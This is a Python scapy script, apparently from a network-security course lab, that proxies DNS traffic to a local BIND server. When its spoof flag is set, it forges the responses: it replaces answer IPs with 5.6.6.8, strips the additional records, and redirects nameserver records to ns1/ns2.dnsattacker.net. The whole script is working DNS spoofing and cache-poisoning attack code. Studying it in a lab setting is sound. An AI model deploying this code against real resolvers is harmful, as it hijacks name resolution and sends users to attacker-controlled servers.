#!/usr/bin/env python
import argparse
import socket
from scapy.all import *


# This is going to Proxy in front of the Bind Server

parser = argparse.ArgumentParser()
parser.add_argument(
    "--port", help="port to run your proxy on - careful to not run it on the same port as the BIND server", type=int)
parser.add_argument(
    "--dns_port", help="port the BIND uses to listen to dns queries", type=int)
parser.add_argument("--spoof_response", action="store_true",
                    help="flag to indicate whether you want to spoof the BIND Server's response (Part 3) or return it as is (Part 2). Set to True for Part 3 and False for Part 2", default=False)
args = parser.parse_args()

# Port to run the proxy on
port = args.port
# BIND's port
dns_port = args.dns_port
# Flag to indicate if the proxy should spoof responses
SPOOF = args.spoof_response
#HOST = '128.100.8.174'
HOST = '127.0.0.1'


#creating socket binding for operation to pre defined port
s_client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s_client.bind(('', port))

#creating socket for sending data to BIND
s_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)

print 'starting server'
while True:
    #get data from listen port
    data, addr = s_client.recvfrom(1024)
    #print 'Connected by'+ str(addr)

    #convert response data to DNS format
    response_listen = DNS(data)
    #print response_listen.show()

    #once we got DNS data, we send to BIND
    s_send.sendto(str(data), (HOST, dns_port))
    response = s_send.recv(4096)
    response = DNS(response)

    #once we got DNS response from BIND,
    # depending on the value SPOOF is true or not, we modify it send it back to client or just send it client
    #print response.ns.show()
    if SPOOF == True:
        #modify the IP
        if response.an != None:
            response.an.rdata = "5.6.6.8"
            print response.an.rdata
        #empty the ar field
        if response.ar != None:
            response.ar = ""
        limit = max(response.nscount, 2)
        #modify the NS field to attach ns server
        for count in xrange(limit - 1, -1 ,-1 ):
            if count <= 1:
                if count == 0 and response.ns[0] != None:
                    response.ns[0].rdata = "ns1.dnsattacker.net"
                if count == 0 and response.ns[0] == None:
                    response.ns[0] = response.an
                    response.ns[0].rdata = "ns1.dnsattacker.net"
                    response.ns[0].type = "NS"

                if count == 1 and response.nscount > 1:
                    response.ns[1].rdata = "ns2.dnsattacker.net"
            else:
                del response.ns[count]

    #send response to client
    s_client.sendto(str(response), (addr[0], addr[1]))


